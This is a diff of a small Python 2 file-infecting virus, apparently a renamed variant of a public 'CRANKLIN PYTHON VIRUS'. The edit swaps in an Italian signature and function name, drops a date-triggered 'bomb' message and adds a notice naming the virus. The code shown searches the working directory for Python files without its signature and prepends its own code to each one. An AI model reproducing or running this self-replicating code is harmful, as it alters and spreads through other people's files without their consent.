@@ -1,8 +1,8 @@
 #!/usr/bin/python
-import os
-import datetime
-SIGNATURE = "CRANKLIN PYTHON VIRUS"
-def search(path):
+#here start virus/qui inizia il virus START
+import os 
+FIRMA = "Mike Sciking Virus"
+def cerca(path):
     filestoinfect = []
     filelist = os.listdir(path)
     for fname in filelist:
@@ -11,7 +11,7 @@ def search(path):
         elif fname[-3:] == ".py":
             infected = False
             for line in open(path+"/"+fname):
-                if SIGNATURE in line:
+                if FIRMA in line:
                     infected = True
                     break
             if infected == False:
@@ -31,9 +31,7 @@ def infect(filestoinfect):
         f = open(fname,"w")
         f.write(virusstring + temp)
         f.close()
-def bomb():
-    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 25:
-        print "HAPPY BIRTHDAY CRANKLIN!"
-filestoinfect = search(os.path.abspath(""))
+filestoinfect = cerca(os.path.abspath(""))
 infect(filestoinfect)
-bomb()
+print "Questo programma e' stato infettato da Mike Sciking Virus. \n Per rimuoverlo cancella dalla linea START alla FINISH"
+#FINISH
